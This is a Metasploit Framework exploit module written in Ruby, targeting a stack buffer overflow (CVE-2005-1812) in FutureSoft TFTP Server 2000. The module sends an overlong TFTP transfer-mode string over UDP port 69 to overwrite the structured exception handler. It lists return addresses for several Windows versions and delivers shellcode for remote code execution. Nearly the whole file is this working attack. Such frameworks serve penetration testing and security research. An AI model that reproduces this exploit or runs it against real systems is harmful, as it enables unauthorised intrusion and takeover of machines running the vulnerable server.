##
# $Id: futuresoft_transfermode.rb 9262 2010-05-09 17:45:00Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = AverageRanking

	include Msf::Exploit::Remote::Udp
	include Msf::Exploit::Remote::Seh

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'FutureSoft TFTP Server 2000 Transfer-Mode Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow in the FutureSoft TFTP Server
				2000 product. By sending an overly long transfer-mode string, we were able
				to overwrite both the SEH and the saved EIP. A subsequent write-exception
				that will occur allows the transferring of execution to our shellcode
				via the overwritten SEH. This module has been tested against Windows
				2000 Professional and for some reason does not seem to work against
				Windows 2000 Server (could not trigger the overflow at all).
			},
			'Author'         => 'MC',
			'Version'        => '$Revision: 9262 $',
			'References'     =>
				[
					['CVE', '2005-1812'],
					['OSVDB', '16954'],
					['BID', '13821'],
					['URL', 'http://www.security.org.sg/vuln/tftp2000-1001.html'],

				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'    => 350,
					'BadChars' => "\x00",
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					['Windows 2000 Pro English ALL',   { 'Ret' => 0x75022ac4} ], # ws2help.dll
					['Windows XP Pro SP0/SP1 English', { 'Ret' => 0x71aa32ad} ], # ws2help.dll
					['Windows NT SP5/SP6a English',    { 'Ret' => 0x776a1799} ], # ws2help.dll
					['Windows 2003 Server English',    { 'Ret' => 0x7ffc0638} ], # PEB return
				],
			'Privileged'     => true,
			'DisclosureDate' => 'May 31 2005'))

		register_options(
			[
				Opt::RPORT(69)
			], self.class)

	end

	def exploit
		connect_udp

		print_status("Trying target #{target.name}...")

		sploit  = "\x00\x01" + rand_text_english(14, payload_badchars) + "\x00"
		sploit += rand_text_english(167, payload_badchars)
		seh  = generate_seh_payload(target.ret)
		sploit[157, seh.length] = seh
		sploit += "\x00"

		udp_sock.put(sploit)

		handler
		disconnect_udp
	end

end
